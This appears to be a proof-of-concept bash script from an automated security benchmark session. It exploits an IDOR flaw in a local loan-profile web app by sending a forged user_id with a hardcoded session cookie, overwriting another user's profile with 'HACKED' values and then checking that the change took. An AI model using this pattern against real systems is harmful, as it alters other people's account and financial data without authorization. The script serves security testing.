#!/bin/bash
# POC: IDOR vulnerability allowing authenticated user to modify other users' loan profiles by manipulating user_id parameter
# Target: ./repo
# Created: 2025-11-07T18:10:15.129Z
# Session: benchmark-XBEN-022-24-mhp5xc5o

# IDOR Vulnerability POC - Modify Other Users' Loan Profiles
# This POC demonstrates how an authenticated user can modify other users' profiles
# by exploiting the lack of authorization checks on the user_id parameter

TARGET_URL="http://localhost:80"
SESSION_COOKIE="eyJ1c2VyX2lkIjoxfQ.aQ41uw.wxGZAOuJ2PRftAw89PLrnUn7G_c"

echo "[*] IDOR Vulnerability POC - Loan Profile Modification"
echo "[*] Target: $TARGET_URL/update_profile"
echo "[*] Authenticated as: user_id=1 (from session cookie)"
echo ""

# Step 1: Attempt to modify user_id=2's profile while authenticated as user_id=1
echo "[*] Step 1: Attempting to modify user_id=2's profile..."
echo "[*] Sending POST request with malicious user_id parameter..."
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL/update_profile" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -d "user_id=2&name=HACKED&lastname=User&email=hacked@test.com&loan_amount=50000&loan_term_months=120&monthly_payment=1000" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[+] HTTP Response Code: $HTTP_CODE"
echo "[+] Response Body:"
echo "$BODY"
echo ""

# Step 2: Verify if the modification was successful by checking the profile
echo "[*] Step 2: Verifying if the modification was successful..."
echo "[*] Fetching user_id=2's profile to confirm changes..."
echo ""

PROFILE_RESPONSE=$(curl -s -X GET "$TARGET_URL/profile?user_id=2" \
  -H "Cookie: session=$SESSION_COOKIE")

echo "[+] User Profile Response:"
echo "$PROFILE_RESPONSE"
echo ""

# Step 3: Check if vulnerable indicators are present
if echo "$PROFILE_RESPONSE" | grep -q "HACKED"; then
    echo "[!] VULNERABILITY CONFIRMED: User profile was successfully modified"
    echo "[!] The name field contains 'HACKED' - IDOR vulnerability exploited"
    exit 0
elif echo "$PROFILE_RESPONSE" | grep -q "hacked@test.com"; then
    echo "[!] VULNERABILITY CONFIRMED: User profile was successfully modified"
    echo "[!] The email field was changed to hacked@test.com - IDOR vulnerability exploited"
    exit 0
elif [ "$HTTP_CODE" = "200" ]; then
    echo "[!] VULNERABILITY LIKELY: HTTP 200 returned, profile modification may have succeeded"
    exit 0
else
    echo "[-] Unable to confirm vulnerability with this response"
    exit 1
fi